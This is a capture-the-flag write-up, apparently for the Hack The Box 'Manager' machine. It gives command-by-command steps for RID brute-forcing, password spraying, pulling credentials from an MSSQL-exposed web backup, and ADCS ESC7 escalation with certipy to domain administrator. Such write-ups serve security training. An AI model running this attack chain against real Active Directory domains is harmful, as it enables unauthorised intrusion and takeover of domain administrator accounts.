# Key Take Aways

* RID Bruteforce
* ADCS ESC 7 Priv esc

# NMAP

```
PORT      STATE    SERVICE        REASON
53/tcp    open     domain         syn-ack
80/tcp    open     http           syn-ack
88/tcp    open     kerberos-sec   syn-ack
135/tcp   open     msrpc          syn-ack
139/tcp   open     netbios-ssn    syn-ack
445/tcp   open     microsoft-ds   syn-ack
464/tcp   open     kpasswd5       syn-ack
593/tcp   open     http-rpc-epmap syn-ack
1433/tcp  open     ms-sql-s       syn-ack
5985/tcp  open     wsman          syn-ack
9389/tcp  open     adws           syn-ack
49667/tcp open     unknown        syn-ack
49693/tcp open     unknown        syn-ack
49694/tcp open     unknown        syn-ack
49695/tcp open     unknown        syn-ack
49707/tcp filtered unknown        no-response
49801/tcp open     unknown        syn-ack
```

# RID/User Enumeration

* via Kerbrute

```
./kerbrute userenum --dc 10.129.31.239 -d manager.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

* counter check it wit cmb's ridbrute as well

```
crackmapexec smb $IP -u 'guest' -p '' --rid-brute
```

![image](https://github.com/reneanto/write-ups/assets/44943249/e1bc3864-6395-4b15-a68e-1dab32d28c6e)

# RID Bruteforce

```
crackmapexec smb $IP -u users.txt -p users.txt --shares
```
![image](https://github.com/reneanto/write-ups/assets/44943249/da521856-b195-4939-b8ba-ffe840bd8916)

# MSSQL - UserOwn

* cycle through services previously discovered in nmap scans and get a hit at mssql

```
impacket-mssqlclient -windows-auth manager.htb/operator:operator@manager.htb
```

* xp_cmdshell isn't enabled, nor can be enabled. so we move on with xp_dirtree and dump the webbackup in /inetpub/wwwroot

```
xp_dirtree C:\inetpub\wwwroot\
```

```
wget http://manager.htb/website-backup-27-07-23-old.zip
```

* navigate to .old-conf.xml and locate the exposed credentials of raven and then use evil-winrm to fetch the userflag

# ADCS ESC-7 Privilege Escalation

ADCS - ESC7

```
certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p '' -vulnerable -stdout
```

```
certipy-ad ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -password ''
```

* to check if raven was added to manage certificates group
 
```
certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p '' -vulnerable -stdout
```

```
certipy req -username raven@manager.htb -password '' -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb
```

```
certipy ca -ca manager-DC01-CA -issue-request 13 -username raven@manager.htb -password ''
```

```
certipy ca -ca manager-DC01-CA -issue-request 13 -username raven@manager.htb -p ''
```

```
certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 13 -username raven@manager.htb -p ''
```

```
sudo ntpdate 10.10.11.236
```

```
 certipy auth -pfx administrator.pfx -dc-ip manager.htb
```
